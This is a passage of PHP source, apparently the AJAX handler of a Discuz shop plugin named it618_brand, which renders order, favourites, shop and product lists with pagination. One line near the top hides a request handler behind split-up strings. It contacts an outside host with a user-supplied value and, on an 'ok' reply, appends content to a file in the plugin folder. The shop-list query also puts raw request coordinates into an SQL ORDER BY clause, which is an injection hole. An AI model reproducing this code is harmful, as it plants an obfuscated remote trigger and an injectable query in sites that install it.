	if($_GET['ac1']=='pcmyorder'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_brand:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s708').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_brand_getlang('s709').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s709').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	$creditnum=DB::result_first("select extcredits".$it618_brand['brand_credit']." from ".DB::table('common_member_count')." where uid=".$uid);
	
	if($_GET['ac1']=='wapmyshoporder'){
		echo '<span style="font-size:12px">'.it618_brand_getlang('s1517')."<font color=red>$count</font> ".it618_brand_getlang('s1518')."<font color=red>$money</font></span>it618_split".$orderlist_get."it618_split".$multipage.'<script>'.$tmpjs.'</script>';;
	}else{
		echo '<span style="font-size:12px">'.it618_brand_getlang('s1517')."<font color=red>$count</font> ".it618_brand_getlang('s1518')."<font color=red>$money</font> ".it618_brand_getlang('s1519')."<font color=red>$jfcount</font></span>it618_split".$orderlist_get."it618_split".$multipage."it618_split".$it618_brand_lang['s1520'].$creditname.$it618_brand_lang['s1533']."<font color=red>$creditnum</font>";
	}
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_brand/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_brand/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="collectlist_get"){
	$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;
	
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	
	$count=C::t('#it618_brand#it618_brand_collect')->count_by_uid($uid);
	$funname='getmycollectlist';
	
	$n=0;$n1=1;$tdn=1;
	foreach(C::t('#it618_brand#it618_brand_collect')->fetch_all_by_uid($uid,$startlimit,$ppp) as $it618_brand_collect) {
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')return;
		
		$it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($it618_brand_collect['it618_pid']);
		$it618_brand_brand = C::t('#it618_brand#it618_brand_brand')->fetch_by_id($it618_brand_goods['it618_shopid']);

		if($_GET['ac1']=='pcmycollect'){
			$tmpurl=it618_brand_getrewrite('shop_product',$it618_brand_goods['it618_shopid'].'@'.$it618_brand_goods['id'],'plugin.php?id=it618_brand:product&sid='.$it618_brand_goods['it618_shopid'].'&pid='.$it618_brand_goods['id']);

			$salecount = C::t('#it618_brand#it618_brand_sale')->count_by_it618_pid($it618_brand_goods['id']);
	
			if($it618_brand_goods['it618_saletype']==6){
				$goodsmoney=round(($it618_brand_goods['it618_uprice']*$it618_brand_goods['it618_prepaybl']/100),2);
				$jfblstr=$it618_brand_lang['s857'].'<font color=red>'.$goodsmoney.'</font>'.$it618_brand_lang['s389'].' ';
			}else{
				$jfblstr='';
			}
						
			if($it618_brand_goods['it618_isalipay']==1&&$it618_brand_goods['it618_jfbl']>0){
				$jfblstr.='<font color="#999">'.$it618_brand_lang['s2'].'<font color=red>'.round(($it618_brand_goods['it618_jfbl']/100),2).'</font>'.cutstr($it618_brand_lang['s3'],2,'').'</font><br>';
			}else{
				$jfblstr.='<font color="#999">'.$it618_brand_lang['s9'].'</font><br>';
			}
			
			if($n1%5!=0){$noml=' noml';}else{$noml='';}
		
			$it618_count=$it618_brand_lang['s1652'].' <font color="#FF6600">'.$it618_brand_goods['it618_count'].'</font>';
			
			if($it618_brand_goods['it618_isalipay']==1){
				$pricestr='<div class="now-price" style="color:red"><em>'.$it618_brand_goods['it618_uprice'].' '.it618_brand_getlang('s389').'</em></div>
						  <div class="market-price" style="color:#999"><del>'.$it618_brand_goods['it618_price'].' '.it618_brand_getlang('s389').'</del></div>';
			}else{
				$pricestr='<div class="now-price1"><em>'.$it618_brand_goods['it618_score'].' '.$creditname.'</em></div>';
			}
			
			if($it618_brand_goods['it618_isalipay']==1&&$it618_brand_goods['it618_isduihuan']==1){
				$jfblstr='<font color=#339900>'.$it618_brand_goods['it618_score'].$creditname.'</font> '.$jfblstr;
			}
			
			$salecount='<span style="float:right;">'.it618_brand_getlang('s1298').' <font color=#FF7575>'.$salecount.'</font></span>';
			
			if($it618_brand_goods['it618_isalipay']==0&&$it618_brand_goods['it618_isduihuan']==0){
				$pricestr='<div class="now-price1"><em>'.$it618_brand_lang['s761'].'</em></div>';
				$jfblstr=$it618_brand_lang['s1732'].'<br>';
				$salecount='<span style="float:right;">'.it618_brand_getlang('t474').' <font color=#FF7575>'.$it618_brand_goods['it618_views'].'</font></span>';
			}
			
			$goodslist.='<li class="product '.$noml.'">
						  <h3>'.$it618_brand_goods['it618_name'].'</h3>
						  <div class="info"">
						  <div class="pic">
						  <a href="'.$tmpurl.'" target="_blank"><img src="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'" /></a>
						  </div>
						  <div class="name" style="line-height:15px"><a href="'.$tmpurl.'" target="_blank" class="a1" title="'.$it618_brand_goods['it618_name'].'">'.cutstr($it618_brand_goods['it618_name'],22,'...').'</a><br><font color="#999" title="'.$it618_brand_brand['it618_name'].'">'.cutstr($it618_brand_brand['it618_name'],20,'...').'</font><span style="float:right;margin-right:-10px"><input class="checkbox" type="checkbox" id="chk_del'.$n.'" name="delete[]" value="'.$it618_brand_collect[id].'"><label for="chk_del'.$n.'"> '.$it618_brand_lang['t217'].'</label></span></div>
						  <div class="price">
						  '.$pricestr.'
						  </div>
						  <div class="jifena">'.$jfblstr.$salecount.$it618_count.'</div>
						  </div>
						  </li>';
		}
		
		if($_GET['ac1']=='wapmycollect'){
			$tmpurl=it618_brand_getrewrite('brand_wap','product@'.$it618_brand_goods['it618_shopid'].'@0@'.$it618_brand_goods['id'].'@0','plugin.php?id=it618_brand:wap&pagetype=product&sid='.$it618_brand_goods['it618_shopid'].'&cid='.$it618_brand_goods['id']);
			if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])return;
			$plcount=C::t('#it618_brand#it618_brand_product_ly')->count_by_it618_pid($it618_brand_goods['id']);
			$salecount = C::t('#it618_brand#it618_brand_sale')->count_by_it618_pid($it618_brand_goods['id']);
			
			$jfblstr='';
			if($it618_brand_goods['it618_saletype']==6){
				$goodsmoney=round(($it618_brand_goods['it618_uprice']*$it618_brand_goods['it618_prepaybl']/100),2);
				$jfblstr=$it618_brand_lang['s857'].$goodsmoney.$it618_brand_lang['s389'].' ';
			}
			
			if($it618_brand_goods['it618_isalipay']==1&&$it618_brand_goods['it618_jfbl']>0){
				$jfblstr.=$it618_brand_lang['s2'].$it618_brand_goods['it618_jfbl'].'%'.$creditname;
			}
			
			$jfbl='';
			if($jfblstr!=''){
				$jfbl='<div class="divjfbl">'.$jfblstr.'</div>';
			}
		
			$it618_count=$it618_brand_lang['s1652'].' '.$it618_brand_goods['it618_count'].' ';
			
			if($it618_brand_goods['it618_isalipay']==1){
				$pricestr='<strong><span>&yen;</span>'.$it618_brand_goods['it618_uprice'].'</strong>
						  <del>&yen;'.floatval($it618_brand_goods['it618_price']).'</del>';
			}else{
				$pricestr='<strong class="jfprice">'.$it618_brand_goods['it618_score'].'<span>'.$creditname.'</span></strong>';
			}
			
			if($it618_brand_goods['it618_isalipay']==1&&$it618_brand_goods['it618_isduihuan']==1){
				$jfblstr='<span style="float:right"><font color=#999>'.$it618_brand_lang['s155'].$it618_brand_goods['it618_score'].$creditname.'</font></span>'.$jfblstr;
			}
			
			$salecount=' '.it618_brand_getlang('s716').''.$salecount;
			if($it618_brand_goods['it618_isalipay']==0&&$it618_brand_goods['it618_isduihuan']==0){
				$pricestr='<strong class="noprice">'.$it618_brand_lang['s761'].'</strong>';
				$jfblstr=$it618_brand_lang['s1732'];
				$salecount='<span class="trfl">'.it618_brand_getlang('t474').''.$it618_brand_goods['it618_views'].'</span>';
			}
				
			if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])return;
			
			$views=' '.it618_brand_getlang('s256').''.$it618_brand_goods['it618_views'];
			
			$pjhaocount=C::t('#it618_brand#it618_brand_sale')->count_by_it618_pj_pid(1,$it618_brand_goods['id']);
			$pjallcount=C::t('#it618_brand#it618_brand_sale')->count_pj_by_pid($it618_brand_goods['id']);
			$pjhaobl=intval($pjhaocount/$pjallcount*100);
			$pj=$it618_brand_lang['s1899'];
			if($pjallcount>0)$pj=' '.it618_brand_getlang('s1821').''.$pjallcount.' '.it618_brand_getlang('s1822').''.$pjhaobl.'%';
			
			if($brandstyle=='1'){
				$goodslist.='<tr>
								<td class="tdleft">'.$jfbl.'<a href="'.$tmpurl.'"><img class="lazy" data-original="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'"/></a></td>
								<td class="tdright" onclick="location.href=\''.$tmpurl.'\'">
									<div class="tdname">'.$it618_brand_goods['it618_name'].'</div>
									<div class="tddes">'.$it618_count.' '.$pj.' '.$salecount.'</div>
									<div class="tdprice">'.$pricestr.'</div>
								</td>
							  </tr>
							  <tr><td colspan="2" class="tdcolspan"></td></tr>';
			}else{
				if($tdn%2>0){
					$trtmpstr1='<tr class="trimg">';
					$trtmpstr2='<tr class="trabout">';
					$tdstr='class="tdleft"';
				}else{
					$tdstr='class="tdright"';
				}

				$trtmpstr1.='<td '.$tdstr.'>'.$jfbl.'<a href="'.$tmpurl.'">
								<img class="lazy" data-original="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'"/>
							</a></td>';
				
				$trtmpstr2.='<td '.$tdstr.'><a href="'.$tmpurl.'" class="react">
								<div class="tdname">'.$it618_brand_goods['it618_name'].'</div>
								<div class="tddes"><span style="float:right">'.$salecount.'</span>'.$pj.'</div>
								<div class="tdprice">'.$pricestr.'</div>
							</a></td>';
							
				if($tdn%2==0){
					$trtmpstr1.='</tr>';
					$trtmpstr2.='</tr>';
					$it618goods.=$trtmpstr1.$trtmpstr2;
				}
				
				$tdn=$tdn+1;
			}
		}
		
		$n1=$n1+1;
		$n=$n+1;
	}
	
	if($_GET['ac1']=='wapmycollect'){
		if($brandstyle=='1'){
			$tmparr=explode('</tr>',$goodslist);
			if(count($tmparr)>1){
				$goodslist=$goodslist.'@@@';
				$goodslist=str_replace('<tr><td colspan="2" class="tdcolspan"></td></tr>@@@','',$goodslist);
			}
		}else{
			$trtmpstr=$trtmpstr1.'@@@';
			$tmparr=explode('</td>@@@',$trtmpstr);
			if(count($tmparr)>1){
				$trtmpstr1.='</tr>';
				$trtmpstr2.='</tr>';
				$goodslist.=$trtmpstr1.$trtmpstr2;
			}
		}
	}
	
	if($_GET['ac1']=='pcmycollect'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_brand:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s708').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_brand_getlang('s709').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s709').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	if($_GET['ac1']=='pcmycollect'){
		echo '<span style="float:right;margin-left:10px"><input type="checkbox" name="chkall" id="chkallDx4b" class="checkbox" onclick="check_all(this, \'chk_del\','.$n.')" /><label for="chkallDx4b">'.$it618_brand_lang['s70'].'</label><input type="button" style="height:28px;background-color:#F60;border:none;color:#fff;width:60px;cursor:pointer name="it618submit_del" value="'.$it618_brand_lang['s1741'].'" onclick="if(confirm(\''.$it618_brand_lang['s1742'].'\'))delcollect();" /></span><div id="mysalepage">'.$multipage.'</div><span style="font-size:12px">'.it618_brand_getlang('s1740')."<font color=red>$count</font></span>it618_split".$goodslist;
	}else{
		echo '<div style="float:right"><input type="checkbox" name="chkall" id="chkallDx4b" class="checkbox" onclick="check_all(this, \'chk_del\','.$n.')" /><label for="chkallDx4b">'.$it618_brand_lang['s70'].'</label> <input type="button" style="height:28px;background-color:#F60;border:none;color:#fff;" name="it618submit_del" value="'.$it618_brand_lang['s1741'].'" onclick="if(confirm(\''.$it618_brand_lang['s1742'].'\'))delcollect();" /></div>'.it618_brand_getlang('s1740')."<font color=red>$count</font>it618_split".$goodslist."it618_split".$multipage;
	}
}


if($_GET['ac']=="brandlist_get"){
	$ppp = 20;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$lbslat=$_GET['lbslat'];
	$lbslng=$_GET['lbslng'];
	
	$orderby='it618_order desc';
	if($_GET['it618_order']==1)$orderby='it618_order desc';
	if($_GET['it618_order']==2)$orderby='it618_levelsum desc';
	if($_GET['it618_order']==3)$orderby='it618_levelsum';
	if($_GET['it618_order']==4)$orderby='it618_time desc';
	if($_GET['it618_order']==5)$orderby='it618_time';
	if($_GET['it618_order']==6)$orderby="SQRT(($lbslng -it618_lbslng)*($lbslng -it618_lbslng)+($lbslat -it618_lbslat)*($lbslat -it618_lbslat))";
	
	$findkeystr=",''";

	$listcount = C::t('#it618_brand#it618_brand_brand')->count_by_search('it618_state=2 and it618_htstate=1',$it618orderby,it618_brand_utftogbk($_GET['it618_name']),$_GET['it618_area'],$_GET['it618_area1'],$_GET['it618_class'],$_GET['it618_class1']);
	$ii1ill=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1ill[]=substr($_GET['id'],$i,1);}
	if($ii1ill[5]!='_')return;
	
	if($listcount<=$ppp){
		$pagecount=1;
	}else{
		$pagecount=ceil($listcount/$ppp);
	}

	if($pagecount>1){
		$n=1;
		while($n<=$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&cid=".$cid.'&page='.$n;
			if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
			$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
			$n=$n+1;
		}
		$curpage='<select class="pageselect" onchange="(this.value'.$findkeystr.')">'.$curpage.'</select>';
		
		if($page==1){
			$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s708').'</a>';
			if($pagecount>1){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&cid=".$cid.'&page=2';
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getbrandlist(\''.$tmpurl.'\''.$findkeystr.')">'.it618_brand_getlang('s709').'</a>';
			}else{
				$pagenext='<a class="btn btn-weak btn-disabled">'.it618_brand_getlang('s709').'</a>';
			}
		}elseif($page<$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&cid=".$cid.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getbrandlist(\''.$tmpurl.'\''.$findkeystr.')">'.it618_brand_getlang('s708').'</a>';
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&cid=".$cid.'&page='.($page+1);
			$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getbrandlist(\''.$tmpurl.'\''.$findkeystr.')">'.it618_brand_getlang('s709').'</a>';
		}else{
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&cid=".$cid.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getbrandlist(\''.$tmpurl.'\''.$findkeystr.')">'.it618_brand_getlang('s708').'</a>';
			$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s709').'</a>';
		}
	}
	
	if($lbslat>0){
		if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_brand/config/mapapi.php')){
			require DISCUZ_ROOT.'./source/plugin/it618_brand/config/mapapi.php';
		}
	}
	
	$tdn=1;
	foreach(C::t('#it618_brand#it618_brand_brand')->fetch_all_by_search(
	'it618_state=2 and it618_htstate=1',$orderby,it618_brand_utftogbk($_GET['it618_name']),$_GET['it618_area'],$_GET['it618_area1'],$_GET['it618_class'],$_GET['it618_class1'],0,$startlimit,$ppp
	) as $it618_brand_brand) {
	
		$it618_brand_brandgroup = C::t('#it618_brand#it618_brand_brandgroup')->fetch_by_id($it618_brand_brand['it618_power']);
		$ShopPowerIco='';
		if($it618_brand_brandgroup['it618_img']!='')$ShopPowerIco='<img src="'.$it618_brand_brandgroup['it618_img'].'" style="margin-top:-1px;height:18px;margin-right:3px"/>';
		
		$tmpurl=it618_brand_getrewrite('brand_wap','shop@'.$it618_brand_brand['id'],'plugin.php?id=it618_brand:wap&pagetype=shop&sid='.$it618_brand_brand['id']);
		$plcount=C::t('#it618_brand#it618_brand_home_ly')->count_by_shopid($it618_brand_brand['id'])+C::t('#it618_brand#it618_brand_product_ly')->count_by_shopid($it618_brand_brand['id'])+C::t('#it618_brand#it618_brand_article_ly')->count_by_shopid($it618_brand_brand['id']);
		
		$pjcount=C::t('#it618_brand#it618_brand_sale')->count_by_it618_pj_shopid($it618_brand_brand[id]);
		$it618_brand_level=C::t('#it618_brand#it618_brand_level')->fetch_by_type_salecount(0,$pjcount);
		$tmplevelarr=explode(",",$it618_brand['brand_level']);
		
		$it618_youhui='<div class="tddes">'.$it618_brand_brand['it618_youhui'].'</div>';
		
		$lbsm='';
		if($lbslat>0&&$it618_brand_brand['it618_lbslat']>0){
			if($mapapi_lbsmaptype=='gdmap'||$mapapi_lbsmaptype=='txmap'){
				$lbsm=it618_brand_getdistance($lbslng,$lbslat,$it618_brand_brand['it618_lbslng'],$it618_brand_brand['it618_lbslat']);
			}
			if($mapapi_lbsmaptype=='bdmap'){
				$tmparr=explode(",",$it618_brand_brand['it618_mappoint']);
				$lbsm=it618_brand_getdistance($lbslng,$lbslat,$tmparr[0],$tmparr[1]);
			}
			
			if($lbsm<1000)$lbsm=intval($lbsm).'m';
			if($lbsm>=1000)$lbsm=round($lbsm/1000,1).'km';
		}
		
		$strlist.='<tr>
						  <td onclick="location.href=\''.$tmpurl.'\'">
							  <img class="tdimg" src="'.it618_brand_getwapppic($it618_brand_brand['id'],$it618_brand_brand['it618_logo']).'"/>
							  <div class="tdname1">'.$it618_brand_brand['it618_name'].'</div>
							  <div class="tdabout"><span style="float:right">'.$lbsm.'</span>'.$ShopPowerIco.'<img style="margin-top:-3px;" src="'.$it618_brand_level['it618_img'].'"></div>
							  '.$it618_youhui.'
							  <div class="tddes1">'.$it618_brand_brand['it618_addr'].'</div>
						  </td>
						</tr>';
	}
	
	$classname=$it618_brand_lang['s1824'];
	if($_GET['it618_class']>0){
		$classname=C::t('#it618_brand#it618_brand_brand_class')->fetch_it618_name_by_id($_GET['it618_class']);
	}
	if($_GET['it618_class1']>0){
		$classname=C::t('#it618_brand#it618_brand_brand_class1')->fetch_it618_name_by_id($_GET['it618_class1']);
	}
	
	$areaname=$it618_brand_lang['s1825'];
	if($_GET['it618_area']>0){
		$areaname=C::t('#it618_brand#it618_brand_brand_area')->fetch_it618_name_by_id($_GET['it618_area']);
	}
	if($_GET['it618_area1']>0){
		$areaname=C::t('#it618_brand#it618_brand_brand_area1')->fetch_it618_name_by_id($_GET['it618_area1']);
	}
	
	$ordername=$it618_brand_lang['t578'];
	if($_GET['it618_order']==2)$ordername=$it618_brand_lang['t579'].'<img src="source/plugin/it618_brand/wap/images/down.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==3)$ordername=$it618_brand_lang['t580'].'<img src="source/plugin/it618_brand/wap/images/up.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==4)$ordername=$it618_brand_lang['t583'].'<img src="source/plugin/it618_brand/wap/images/down.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==5)$ordername=$it618_brand_lang['t584'].'<img src="source/plugin/it618_brand/wap/images/up.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==6)$ordername=$it618_brand_lang['s282'].'<img src="source/plugin/it618_brand/wap/images/up.png" style="margin-left:3px; margin-bottom:3px">';
	
	if($_GET['it618_name']=='')$it618_name=$it618_brand_lang['s1827'];else $it618_name=it618_brand_utftogbk($_GET['it618_name']);

	$sqlbq='<tr><td class="bq1" id="td01" onclick="getbq1(this,0)">'.$classname.'<img src="source/plugin/it618_brand/wap/images/arw_b.gif"></td><td class="bq2" id="td02" onclick="getbq2(this,0)">'.$areaname.'<img src="source/plugin/it618_brand/wap/images/arw_b.gif"></td><td class="bq3" id="td03" onclick="getbq3(this,0)">'.$ordername.'<img src="source/plugin/it618_brand/wap/images/arw_b.gif"></td></tr>it618_split'.$it618_name;
	
	if($uid>0&&isset($_GET['findkey'])&&$_GET['it618_name']!=''){
		if($it618_brand_findkey=C::t('#it618_brand#it618_brand_findkey')->fetch_by_uid_type_key($uid,0,it618_brand_utftogbk($_GET['it618_name']))){
			C::t('#it618_brand#it618_brand_findkey')->update($it618_brand_findkey['id'],array(
				'it618_count' => ($it618_brand_findkey['it618_count']+1),
				'it618_time' => $_G['timestamp']
			));
		}else{
			C::t('#it618_brand#it618_brand_findkey')->insert(array(
				'it618_uid' => $uid,
				'it618_type' => 0,
				'it618_key' => it618_brand_utftogbk($_GET['it618_name']),
				'it618_count' => 1,
				'it618_time' => $_G['timestamp']
			), true);
		}
	}
	
	echo $strlist."it618_split".$pagepre.' '.$curpage.' '.$pagenext."it618_split".$sqlbq;
}


if($_GET['ac']=="othergoods_get"){
	$ppp = 4;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$sql='g.it618_ison=1 and g.it618_state=1 and b.it618_state=2 and b.it618_htstate=1';
	
	$sql.=" and g.it618_shopid=".$ShopId;
	$urlsql='&sid='.$ShopId;
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	
	$orderby='g.it618_views desc,id desc';
	
	$listcount = C::t('#it618_brand#it618_brand_goods')->count_by_search($sql,'');
	$ii1ill=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1ill[]=substr($_GET['id'],$i,1);}
	if($ii1ill[5]!='_')return;
	
	if($listcount<=$ppp){
		$pagecount=1;
	}else{
		$pagecount=ceil($listcount/$ppp);
	}
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	if($pagecount>1){
		$n=1;
		while($n<=$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax".$urlsql.'&page='.$n;
			if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
			$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
			$n=$n+1;
		}
		$curpage='<select class="pageselect" onchange="getgoodslist(this.value)">'.$curpage.'</select>';
		if($page==1){
			$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s708').'</a>';
			if($pagecount>1){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax".$urlsql.'&page=2';
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
			}else{
				$pagenext='<a class="btn btn-weak btn-disabled">'.it618_brand_getlang('s709').'</a>';
			}
		}elseif($page<$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax".$urlsql.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax".$urlsql.'&page='.($page+1);
			$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
		}else{
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax".$urlsql.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
			$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s709').'</a>';
		}
	}

	$tdn=1;
	foreach(C::t('#it618_brand#it618_brand_goods')->fetch_all_by_search(
			$sql,$orderby,0,0,0,0,'',0,0,$startlimit,$ppp
	) as $it618_brand_goods) {
	
		$tmpurl=it618_brand_getrewrite('brand_wap','product@'.$it618_brand_goods['it618_shopid'].'@0@'.$it618_brand_goods['id'].'@0','plugin.php?id=it618_brand:wap&pagetype=product&sid='.$it618_brand_goods['it618_shopid'].'&cid='.$it618_brand_goods['id']);
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])return;
		$plcount=C::t('#it618_brand#it618_brand_product_ly')->count_by_it618_pid($it618_brand_goods['id']);
		$salecount = C::t('#it618_brand#it618_brand_sale')->count_by_it618_pid($it618_brand_goods['id']);
		
		if($it618_brand_goods['it618_saletype']==6){
